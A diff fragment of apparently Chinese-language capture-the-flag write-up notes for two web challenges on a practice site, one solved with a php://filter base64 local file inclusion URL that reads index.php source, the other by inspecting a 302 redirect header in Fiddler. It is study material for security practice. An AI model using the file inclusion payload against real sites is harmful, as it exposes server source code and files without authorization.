@@ -10,3 +10,15 @@
     
 <a href="./index.php?file=show.php">click me? no</a></html>
 使用连接：http://4.chinalover.sinaapp.com/web7/index.php?file=php://filter/convert.base64-encode/resource=index.php  decode base64获得flag
+
+.查看header 单身一百年也没用
+源码分析：
+<html>
+    <head>
+        <meta http-equiv="content-type" content="text/html;charset=utf-8">
+    </head>
+    <body>
+        <a href="./index.php">_到这里找key__</a>
+    </body>
+</html>
+使用工具fiddler  这是一个302重定向  查看header的 miscellaneous 得到flag
